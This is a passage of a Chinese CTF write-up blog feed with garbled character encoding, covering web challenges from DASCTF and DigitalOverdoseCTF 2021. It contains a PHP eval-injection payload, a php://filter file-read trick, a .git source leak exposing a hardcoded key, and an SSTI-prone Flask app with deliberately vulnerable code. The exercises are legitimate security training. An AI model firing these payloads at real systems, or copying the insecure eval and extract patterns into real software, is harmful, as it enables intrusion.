&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">array = &lt;/span>&lt;span style="color:#d88200">$data&lt;/span>&lt;span style="color:#d88200">;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;array(&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$attrids&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;=&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?attrid[]=&amp;amp;attrvalue[]=&amp;quot;);phpinfo();//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024120107148.png" alt="image-20211024120107148">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://blog.csdn.net/zz_Caleb/article/details/88671071">CG-CTF å˜é‡è¦†ç›–(PHP extractå‡½æ•°åˆ©ç”¨)&lt;/a> | &lt;a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/">CTF-PHPé»‘é­”æ³•&lt;/a>&lt;/p>
&lt;h2 id="miscwelcome-dasctfxjlenu">Misc/WELCOME DASCTFxJlenu&lt;/h2>
&lt;blockquote>
&lt;p>æ¬¢è¿Žæ¥åˆ°é­”æ³•çš„ä¸–ç•Œï¼ˆç­¾åˆ°ï¼‰&lt;/p>
&lt;/blockquote>
&lt;p>å¯æ˜¯æœ‰å‡ å±‚åŒ…æµ†çš„åŽŸé¢˜äº†å±žäºŽæ˜¯ï¼Œä¹‹å‰ç»å¯¹åšè¿‡ä¸€æ¬¡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105141498.png" alt="image-20211024105141498">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105144295.png" alt="image-20211024105144295">&lt;/p></description></item><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
&lt;blockquote>
&lt;p>Visit the website&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png" alt="image-20211009120536593">&lt;/p>
&lt;p>emmmm è”ç³»è¿™ä¸ªé¢˜ç›® è®¿é—®ä¸€ä¸‹.gitçœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png" alt="image-20211019214445911">&lt;/p>
&lt;p>ç”¨GitHackerä¸‹è½½æ³„éœ²çš„gitæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªindex.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Simple sodium crypto class for PHP &amp;gt;= 7.2
&lt;/span>&lt;span style="color:#d88200"> * @author MRK
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @return type
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">create_encryption_key&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sodium_crypto_secretbox_keygen&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Encrypt a message
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @param string $message - message to encrypt
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - encryption key created using create_encryption_key()
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$cipher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75af00">sodium_crypto_secretbox&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$cipher&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Decrypt a message
&lt;/span>&lt;span style="color:#d88200"> * @param string $encrypted - message encrypted with safeEncrypt()
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - key used for encryption
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">decrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the encoding failed&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mb_strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_MACBYTES&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was truncated&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sodium_crypto_secretbox_open&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was tampered with in transit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$plain&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$privatekey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$enc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$privatekey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$enc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒ…å«äº†è§£å¯†çš„æ¨¡å—ï¼Œæ‰€ä»¥ç”¨å®ƒè§£å¯†ä¸€ä¸‹å³å¯&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œæˆ‘çš„æœ¬åœ°phpä¸€ç›´å‡ºé—®é¢˜ ç‰ˆæœ¬7.3.4å’Œ7.4.21éƒ½æŠ¥é”™&lt;/p>
&lt;h2 id="webnotrequired">Web/notrequired&lt;/h2>
&lt;blockquote>
&lt;p>Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?&lt;/p>
&lt;/blockquote>
&lt;p>æ³¨æ„åˆ°é“¾æŽ¥æ˜¯http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html&lt;/p>
&lt;p>ç”¨ä¼ªåè®®çœ‹ä¸€ä¸‹index.phpçš„æºç /index.php?file=php://filter/convert.base64-encode/resource=index.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png" alt="image-20211009193402728">&lt;/p>
&lt;p>è®¿é—®/bin/secrets.txtï¼Œå¾—åˆ° QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==&lt;/p>
&lt;p>&lt;code>BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}&lt;/code>&lt;/p>
&lt;h2 id="webmadlib">Web/madlib&lt;/h2>
&lt;blockquote>
&lt;p>I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!&lt;/p>
&lt;p>Try it out and let me know what you think! The character length limit should make this app pretty secure.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸€ä¸ªflaskçš„webapp&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png" alt="image-20211020005245072">&lt;/p>
&lt;p>å…ˆçœ‹ä¸‹æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/madlib&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">madlib&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">verb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;verb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">noun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;noun&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">adjective&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;adjective&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;person&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">place&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;place&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">place&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;your words must not be longer than 21 characters!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#111">madlib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;To find out what this is you must &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> the internet then get to the &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> system through the visual MAC hard drive and program the open-source but overriding the bus won&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> taught me this trick when we met in &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">place&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> allowing you to download the knowledge of what this is directly to your brain.&amp;#39;&lt;/span>
